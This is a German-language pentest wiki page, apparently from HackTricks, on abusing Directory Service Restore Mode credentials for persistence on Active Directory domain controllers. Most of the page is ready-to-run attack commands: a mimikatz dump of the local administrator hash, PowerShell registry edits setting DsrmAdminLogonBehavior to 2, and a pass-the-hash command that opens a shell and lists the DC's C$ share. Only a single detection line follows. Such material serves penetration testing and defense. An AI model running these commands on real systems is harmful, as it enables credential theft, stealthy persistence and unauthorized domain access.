# DSRM Credentials

{{#include ../../banners/hacktricks-training.md}}

## Grundlegende Informationen

In jedem **DC** gibt es ein **local administrator**-Konto. Wenn du über Administratorrechte auf diesem Computer verfügst, kannst du mit mimikatz den **hash des lokalen Administrator-Kontos dumpen**. Anschließend kannst du eine Registry ändern, um dieses Passwort zu **aktivieren**, sodass du remote auf diesen lokalen Administrator-Benutzer zugreifen kannst.\
Zuerst müssen wir den **hash** des **lokalen Administrator**-Benutzers innerhalb des DC **dumpen**:
```bash
Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"'
```
Dann müssen wir prüfen, ob dieses Konto funktioniert. Wenn der Registrierungsschlüssel den Wert „0“ hat oder nicht existiert, musst du ihn auf **„2“ setzen**:
```bash
Get-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior #Check if the key exists and get the value
New-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior -value 2 -PropertyType DWORD #Create key with value "2" if it doesn't exist
Set-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior -value 2  #Change value to "2"
```
Dann kannst du mithilfe eines **PTH** den Inhalt von C$ auflisten oder sogar eine Shell erhalten. Beachte, dass zum Erstellen einer neuen PowerShell-Sitzung mit diesem Hash im Speicher (für den PTH) als **„domain“** lediglich der Name des DC-Rechners verwendet wird:
```bash
sekurlsa::pth /domain:dc-host-name /user:Administrator /ntlm:b629ad5753f4c441e3af31c97fad8973 /run:powershell.exe
#And in new spawned powershell you now can access via NTLM the content of C$
ls \\dc-host-name\C$
```
Weitere Informationen dazu unter: [https://adsecurity.org/?p=1714](https://adsecurity.org/?p=1714) und [https://adsecurity.org/?p=1785](https://adsecurity.org/?p=1785)<sup>[[1]](#references)[[2]](#references)</sup>

## Maßnahmen

- Event ID 4657 - Überwachung der Erstellung/Änderung von `HKLM:\System\CurrentControlSet\Control\Lsa DsrmAdminLogonBehavior`

## Referenzen

- [1] [Sneaky Active Directory Persistence #11: Directory Service Restore Mode (DSRM)](https://adsecurity.org/?p=1714)
- [2] [Sneaky Active Directory Persistence #13: DSRM Persistence v2](https://adsecurity.org/?p=1785)

{{#include ../../banners/hacktricks-training.md}}
